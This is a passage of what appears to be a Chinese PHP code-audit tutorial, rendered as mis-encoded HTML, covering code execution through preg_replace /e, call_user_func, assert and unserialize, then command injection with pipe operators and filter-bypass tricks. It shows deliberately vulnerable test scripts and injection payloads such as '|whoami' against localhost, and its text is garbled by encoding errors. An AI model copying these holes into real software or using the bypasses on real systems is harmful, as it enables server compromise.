é…ç½®ä¸­çš„magic_quotes_gpc=Offæ—¶ï¼Œå‡½æ•°ä¼šå°†å…¶ç¬¬äºŒä¸ªå‚æ•°å€¼å½“åš  PHP ä»£ç è¿›è¡Œè§£ææ‰§è¡Œï¼Œè¯¥å‡½æ•°çš„ä¸‰ä¸ªå‚æ•°éƒ½æ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œå› æ­¤ï¼Œæ˜¯äº§ç”Ÿä»£ç æ‰§è¡Œæ¼æ´çš„å…³é”®ã€‚</p><p>å‚æ•°åˆ©ç”¨</p><p>ç¬¬ä¸€ä¸ªå‚æ•°</p><p>å¯¹PHP5.6åŠä¹‹å‰çš„æ¡†æ¶ï¼Œæ–°å»ºä¸€ä¸ª test1.php è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">&quot;/&lt;php&gt;(.*?)&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;reg&#x27;</span>], <span class="string">&#x27;\\1&#x27;</span>, <span class="string">&#x27;&lt;php&gt;phpinfo()&lt;/php&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—® URL åœ°å€è§¦å‘äº†è¯¥ä»£ç æ‰§è¡Œæ¼æ´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test1.php?reg=%3C\/php%3E/e</span></span><br></pre></td></tr></table></figure><p><img src="/2021/4050625683/image-20211223184634876.png" alt="image-20211223184634876"> </p><p>ç¬¬äºŒä¸ªå‚æ•°åˆ©ç”¨</p><p>æ–°å»º test2.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">&quot;/anyingv/e&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>], <span class="string">&#x27;anyingv_test&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—® URL</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test2.php?test=phpinfo()</span></span><br></pre></td></tr></table></figure><p> <img src="/2021/4050625683/image-20211223185528777.png" alt="image-20211223185528777"> </p><p>ç¬¬ä¸‰ä¸ªå‚æ•°</p><p>æ–°å»º test3.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">&quot;/&lt;php&gt;(.*?)&lt;\/php&gt;/e&quot;</span>, <span class="string">&#x27;\\1&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®URL</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test3.php?test=&lt;php&gt;phpinfo()&lt;/php&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/4050625683/image-20211223190010801.png" alt="image-20211223190010801"> </p><h3 id="2-call-user-func"><a href="#2-call-user-func" class="headerlink" title="2.call_user_func"></a>2.call_user_func</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> <span class="variable">$parameter</span> = ?, <span class="keyword">mixed</span> $... = ?): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•° <code>callback</code> æ˜¯è¢«è°ƒç”¨çš„å›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">call_user_func(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>], <span class="variable">$b</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—® URL</p><p><img src="/2021/4050625683/image-20211223190511841.png" alt="image-20211223190511841"> </p><h3 id="3-array-map"><a href="#3-array-map" class="headerlink" title="3.array_map()"></a>3.array_map()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">array</span> <span class="variable">$array</span>, <span class="keyword">array</span> ...<span class="variable">$arrays</span>): <span class="keyword">array</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å›è°ƒå‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦å¤„ç†çš„æ•°ç»„</p><p>æ–°å»ºtest5.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">array_map(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>], <span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—® URL</p><p><img src="/2021/4050625683/image-20211223191049749.png" alt="image-20211223191049749"> </p><h3 id="4-åŠ¨æ€å‡½æ•°-a-b-ä¸-assert"><a href="#4-åŠ¨æ€å‡½æ•°-a-b-ä¸-assert" class="headerlink" title="4.åŠ¨æ€å‡½æ•° $a($b) ä¸ assert()"></a>4.åŠ¨æ€å‡½æ•° <code>$a($b)</code> ä¸ assert()</h3><p>åŠ¨æ€å‡½æ•°<code>$a($b)</code> çš„åŠŸèƒ½æ˜¯å°† <code>$a</code> æ›¿æ¢ä¸º <code>$_GET[&#39;a&#39;]</code>ï¼Œå°†<code>$b</code> æ›¿æ¢ä¸º <code>$_GET[&#39;b&#39;]</code>ï¼ŒåŠ¨æ€å‡½æ•°åœ¨ä¸å½“ä½¿ç”¨æ—¶é€ æˆçš„ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p><p>æ–°å»º test6.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/4050625683/image-20211223191637056.png" alt="image-20211223191637056"> </p><p>assert() å‡½æ•°åˆ¤æ–­ä¸€ä¸ªè¡¨è¾¾å¼æ˜¯å¦æˆç«‹ï¼Œè¿”å› true æˆ– falseï¼Œå½“å…¶å‚æ•°ä¸ºå¤šä¸ªå­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²æ—¶ï¼Œè¯¥å‡½æ•°é¦–å…ˆå°†å­—ç¬¦ä¸²å½“åšPHPä»£ç æ‰§è¡Œï¼Œå¹¶å°†ä»£ç æ‰§è¡Œè¿”å›çš„ç»“æœä½œä¸ºè¡¨è¾¾å¼åˆ¤æ–­æ˜¯å¦æœ‰æ•ˆã€‚</p><p>æ–°å»º test7.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">assert(phpinfo());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/4050625683/image-20211223191927853.png" alt="image-20211223191927853"> </p><p>ç›´æ¥è§¦å‘åµŒå…¥çš„phpinfo()ä»£ç </p><h3 id="5-ååºåˆ—åŒ–ä»£ç æ‰§è¡Œä¸eval"><a href="#5-ååºåˆ—åŒ–ä»£ç æ‰§è¡Œä¸eval" class="headerlink" title="5.ååºåˆ—åŒ–ä»£ç æ‰§è¡Œä¸eval()"></a>5.ååºåˆ—åŒ–ä»£ç æ‰§è¡Œä¸eval()</h3><p>åœ¨ååºåˆ—åŒ–ç»“æŸæ—¶ï¼Œå¦‚æœæœªå¯¹ç”¨æˆ·è¾“å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä»è€Œå¯¼è‡´ä»£ç æ‰§è¡Œï¼Œç›®å½•éå†ï¼ŒSQLæ³¨å…¥ç­‰ä¸å¯æ§çš„åæœï¼Œå› ä¸ºè¯­è¨€çš„ç‰¹å¾ï¼Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æœ‰å¯èƒ½ä¼šè§¦å‘å¯¹è±¡ä¸­çš„é­”æœ¯æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__construct()<span class="comment">//ç±»çš„æ„é€ å‡½æ•°</span></span><br><span class="line">__destruct() <span class="comment">//ç±»çš„ææ„å‡½æ•°</span></span><br><span class="line">__call() <span class="comment">//åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</span></span><br><span class="line">__callStatic() <span class="comment">//ç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</span></span><br><span class="line">__get() <span class="comment">//è·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</span></span><br><span class="line">__set() <span class="comment">//è®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</span></span><br><span class="line">__isset() <span class="comment">//å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è°ƒç”¨</span></span><br><span class="line">__unset() <span class="comment">//å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶è¢«è°ƒç”¨ã€‚</span></span><br><span class="line">__sleep() <span class="comment">//æ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span></span><br><span class="line">__wakeup() <span class="comment">//æ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span></span><br><span class="line">__toString() <span class="comment">//ç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•</span></span><br><span class="line">__invoke() <span class="comment">//è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•</span></span><br><span class="line">__set_state() <span class="comment">//è°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</span></span><br><span class="line">__clone() <span class="comment">//å½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨</span></span><br><span class="line">__autoload() <span class="comment">//å°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</span></span><br><span class="line">__debugInfo() <span class="comment">//æ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯</span></span><br></pre></td></tr></table></figure><p>eval()å‡½æ•°æŠŠå‚æ•°çš„å­—ç¬¦ä¸²å€¼å½“åš PHP ä»£ç æ¥æ‰§è¡Œï¼Œå½“å­—ç¬¦ä¸²æ˜¯åˆæ³•çš„ PHP ä»£ç ä¸”ä»¥åˆ†å·ä½œä¸ºè¡Œç»“å°¾æ—¶ï¼Œä»£ç åœ¨æœåŠ¡ç«¯çš„è¿è¡Œæ•ˆæœä¸é€šè¿‡è¯¥å‡½æ•°è§¦å‘æ‰§è¡Œæ•ˆæœç›¸åŒã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;cdf&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;$a=$b;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆç»“æœä¸º cdf</p><p>è§¦å‘ååºåˆ—åŒ–æ¼æ´ï¼Œéœ€è¦å…·å¤‡ä¸¤ä¸ªæ¡ä»¶</p><ul><li>unserialize() å‡½æ•°çš„å‚æ•°å¯æ§</li><li>PHP ä»£ç æ–‡ä»¶ä¸­å­˜åœ¨å¯åˆ©ç”¨çš„ç±»ï¼Œç±»ä¸­æœ‰é­”æœ¯æ–¹æ³•</li></ul><p>æ–°å»º test8.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ›å»ºpayload.php</p><p>å…ˆè®¿é—® payloadé¡µé¢ï¼Œè·å–payloadï¼Œç„¶åå°†payloadè¾“å…¥åˆ° testä¸­è§¦å‘äº†ååºåˆ—åŒ–æ¼æ´</p><p><img src="/2021/4050625683/image-20211223194733034.png" alt="image-20211223194733034"> </p><h2 id="0x02-å‘½ä»¤æ‰§è¡Œ"><a href="#0x02-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="0x02 å‘½ä»¤æ‰§è¡Œ"></a>0x02 å‘½ä»¤æ‰§è¡Œ</h2><p>å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œå› ä¸ºæ²¡æœ‰å¯¹ç”¨æˆ·ä¼ å…¥æˆ–æ„é€ çš„å‚æ•°è¿›è¡Œæœ‰æ•ˆçš„å®‰å…¨æ£€æµ‹ï¼Œä»è€Œæ‰§è¡Œäº†å‚æ•°ä¸­åµŒå…¥çš„ç³»ç»Ÿæ“ä½œå‘½ä»¤æˆ–è°ƒç”¨äº†è§¦å‘ç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œæ˜¯çš„æ”»å‡»è€…å¯ä»¥åœ¨ç›®æ ‡ç³»ç»Ÿä¸­ä¸å—é™åˆ¶åœ°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚ å…³æœºæ‰§è¡Œï¼ŒæŸ¥è¯¢IPï¼Œåˆ é™¤ï¼Œç§»åŠ¨ï¼Œç­‰å¸¸è§çš„dosæˆ–è€…Linuxå‘½ä»¤ã€‚</p><h3 id="1-å‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="#1-å‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" title="1.å‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>1.å‘½ä»¤æ‰§è¡Œå‡½æ•°</h3><p> è¯¦æƒ…å¯å‚è€ƒ <a href="https://www.php.net/manual/zh/">https://www.php.net/manual/zh/</a></p><table><thead><tr><th>å‘½ä»¤</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>exec()</td><td>æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åº</td></tr><tr><td>system()</td><td>æ‰§è¡Œå¤–éƒ¨ç¨‹åºï¼Œå¹¶ä¸”æ˜¾ç¤ºè¾“å‡º</td></tr><tr><td>shell_exec()</td><td>é€šè¿‡ shell ç¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›</td></tr><tr><td>passthru()</td><td>æ‰§è¡Œå¤–éƒ¨ç¨‹åºå¹¶ä¸”æ˜¾ç¤ºåŸå§‹è¾“å‡º</td></tr><tr><td>popen()</td><td>æ‰“å¼€è¿›ç¨‹æ–‡ä»¶æŒ‡é’ˆ</td></tr><tr><td>proc_open()</td><td>æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œå¹¶ä¸”æ‰“å¼€ç”¨æ¥è¾“å…¥/è¾“å‡ºçš„æ–‡ä»¶æŒ‡é’ˆ</td></tr><tr><td>pcntl_exec()</td><td>åœ¨å½“å‰è¿›ç¨‹ç©ºé—´æ‰§è¡ŒæŒ‡å®šç¨‹åº</td></tr></tbody></table><h3 id="2-ç®¡é“ç¬¦"><a href="#2-ç®¡é“ç¬¦" class="headerlink" title="2.ç®¡é“ç¬¦"></a>2.ç®¡é“ç¬¦</h3><p>å‘½ä»¤æ‰§è¡Œæ¼æ´éœ€è¦åˆ©ç”¨æ“ä½œç³»ç»Ÿæä¾›çš„ç®¡é“ç¬¦åŠŸèƒ½ï¼Œç®¡é“ç¬¦çš„æ„æ€å°±æ˜¯ï¼Œå°†å‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºï¼Œä½œä¸ºåä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ã€‚</p><p>windows å’Œ Linux ç¯å¢ƒä¸‹çš„ç¬¦å·ç›¸åŒï¼Œå«ä¹‰ä¸ç›¸åŒ</p><table><thead><tr><th>å‘½ä»¤</th><th>windows</th><th>Linux</th></tr></thead><tbody><tr><td><code>,</code></td><td>æ— </td><td>æ‰§è¡Œå®Œå‰é¢çš„å‘½ä»¤å†æ‰§è¡Œåé¢çš„å‘½ä»¤</td></tr><tr><td><code>&amp;</code></td><td>å‰é¢çš„å‘½ä»¤ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„å‘½ä»¤<br>ä¸ºçœŸï¼Œåˆ™åœ¨å‰é¢çš„å‘½ä»¤æ‰§è¡Œåå†æ‰§è¡Œåé¢çš„å‘½ä»¤</td><td>å‰é¢çš„å‘½ä»¤ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„å‘½ä»¤<br>ä¸ºçœŸï¼Œåˆ™åœ¨å‰é¢çš„å‘½ä»¤æ‰§è¡Œåå†æ‰§è¡Œåé¢çš„å‘½ä»¤</td></tr><tr><td><code>&amp;&amp;</code></td><td>å‰é¢çš„å‘½ä»¤ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼›<br>åä¹‹ï¼Œå‰é¢çš„å‘½ä»¤æ‰§è¡ŒæˆåŠŸåæ‰æ‰§è¡Œåé¢çš„å‘½ä»¤</td><td>å‰é¢çš„å‘½ä»¤ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼›<br>åä¹‹ï¼Œå‰é¢çš„å‘½ä»¤æ‰§è¡ŒæˆåŠŸåæ‰æ‰§è¡Œåé¢çš„å‘½ä»¤</td></tr><tr><td>`</td><td>`</td><td>å‰é¢çš„å‘½ä»¤ä¸æ‰§è¡Œï¼Œç›´æ¥æ‰§è¡Œåé¢çš„å‘½ä»¤</td></tr><tr><td>`</td><td></td><td>`</td></tr></tbody></table><h3 id="3-å‘½ä»¤æ³¨å…¥ç»•è¿‡"><a href="#3-å‘½ä»¤æ³¨å…¥ç»•è¿‡" class="headerlink" title="3.å‘½ä»¤æ³¨å…¥ç»•è¿‡"></a>3.å‘½ä»¤æ³¨å…¥ç»•è¿‡</h3><p>æˆ‘ä»¬åœ¨ä»£ç å®¡è®¡çš„æ—¶å€™ï¼Œè¦æ„é€ payloadçš„ï¼Œæœ‰äº›æƒ…å†µä¸‹ï¼Œéœ€è¦ç»•è¿‡ä¸€äº›è¿‡æ»¤ï¼Œå…·ä½“ç»•è¿‡çš„æ–¹æ³•å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç«  <a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›ç»•è¿‡æŠ€å·§</a>ï¼Œè¿™é‡Œæˆ‘å°±åˆ—ä¸¾ä¸€äº›ç®€å•çš„ç»•è¿‡æ–¹å¼ã€‚</p><p>Linux-ç©ºæ ¼ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$IFS</span></span><br><span class="line">$IFS$<span class="number">1</span></span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$<span class="number">9</span></span><br><span class="line">&lt; æ¯”å¦‚cat&lt;a.tct:è¡¨ç¤ºcat a.txt</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125; <span class="comment">//ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½ï¼Œéœ€è¦ç”¨&#123;&#125;æ‹¬èµ·æ¥</span></span><br><span class="line">%<span class="number">20</span></span><br><span class="line">%<span class="number">09</span></span><br></pre></td></tr></table></figure><p>Linux-å¸¸ç”¨å­—ç¬¦ç»•è¿‡</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&amp; è¡¨ç¤ºå°†ä»»åŠ¡ç½®äºåå°æ‰§è¡Œ</span><br><span class="line">; å¤šè¡Œè¯­å¥ç”¨æ¢è¡ŒåŒºåˆ†ä»£ç å¿«ï¼Œå•è¡Œè¯­å¥ä¸€èˆ¬è¦ç”¨åˆ°åˆ†å·æ¥åŒºåˆ†ä»£ç å—</span><br><span class="line">&amp;&amp; åªæœ‰åœ¨ &amp;&amp; å·¦è¾¹çš„å‘½ä»¤è¿”å›çœŸ(å‘½ä»¤è¿”å›å€¼ $? == 0),&amp;&amp;å³è¾¹çš„å‘½ä»¤æ‰ä¼šè¢«æ‰§è¡Œã€‚</span><br><span class="line">|| åªæœ‰åœ¨ || å·¦è¾¹çš„å‘½ä»¤è¿”å›å‡(å‘½ä»¤è¿”å›å€¼ $? == 1),||å³è¾¹çš„å‘½ä»¤æ‰ä¼šè¢«æ‰§è¡Œã€‚</span><br><span class="line">%0a</span><br><span class="line">%0d</span><br><span class="line">| (ç®¡é“ç¬¦)</span><br></pre></td></tr></table></figure><p>windows-setå‘½ä»¤</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> a=1 </span><br><span class="line"><span class="built_in">echo</span> a</span><br><span class="line"><span class="built_in">echo</span> %a%</span><br></pre></td></tr></table></figure><p><img src="/2021/4050625683/image-20211223203054319.png" alt="image-20211223203054319"> </p><p>set ç»•è¿‡åˆ©ç”¨</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> a=who</span><br><span class="line"><span class="built_in">set</span> b=ami</span><br><span class="line">%a%%b% //æ­£å¸¸æ‰§è¡Œwhoami</span><br><span class="line">call %a%%b% //æ­£å¸¸æ‰§è¡Œwhoami</span><br></pre></td></tr></table></figure><p><img src="/2021/4050625683/image-20211223203028002.png" alt="image-20211223203028002"> </p><p>windows-é€»è¾‘è¿ç®—ç¬¦</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami | ping www.baidu.com</span><br><span class="line">whoami || ping www.baidu.com</span><br><span class="line">qwe &amp; ping www.baidu.com</span><br><span class="line">qwe &amp;&amp; ping www.baidu.com</span><br></pre></td></tr></table></figure><h3 id="4-system"><a href="#4-system" class="headerlink" title="4.system()"></a>4.system()</h3><p>system()ï¼Œå‡½æ•°æ‰§è¡Œå‚æ•°æŒ‡å®šçš„ç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶ä¸”è¾“å‡ºæ‰§è¡Œç»“æœ</p><p>æ–°å»ºtest.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">&#x27;ping 127.0.0.1&#x27;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test.php?test=|whoami</span></span><br></pre></td></tr></table></figure><p> <img src="/2021/4050625683/image-20211224145438768.png" alt="image-20211224145438768"> </p><h3 id="5"><a href="#5" class="headerlink" title="5. ``` `"></a>5. ``` `</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">echo &#x27;&lt;pre&gt;&#x27;; #æ ¼å¼åŒ–è¯­å¥</span><br><span class="line">echo `ping 127.0.0.1 &#123;$_REQUEST[&#x27;test&#x27;]&#125;`;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2021/4050625683/image-20211224153922432.png" alt="image-20211224153922432"> </p><p>6.<code>exec()</code></p><p>exec() å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šè¿”å›ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šçš„å‘½ä»¤è¿è¡Œç»“æœçš„æœ€åä¸€è¡Œï¼Œç¬¬äºŒä¸ªå‚æ•°æœ‰æ•ˆæ—¶ï¼Œä¼šå°†è¿”å›ç»“æœè¿½åŠ åˆ°ç¬¬äºŒä¸ªä»å‚æ•°çš„å€¼åé¢</p><p>æ–°å»ºtest2.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>; <span class="comment">#æ ¼å¼åŒ–è¯­å¥</span></span><br><span class="line">exec(<span class="string">&#x27;ping &#x27;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&#x27;test&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">print_r(<span class="variable">$output</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img 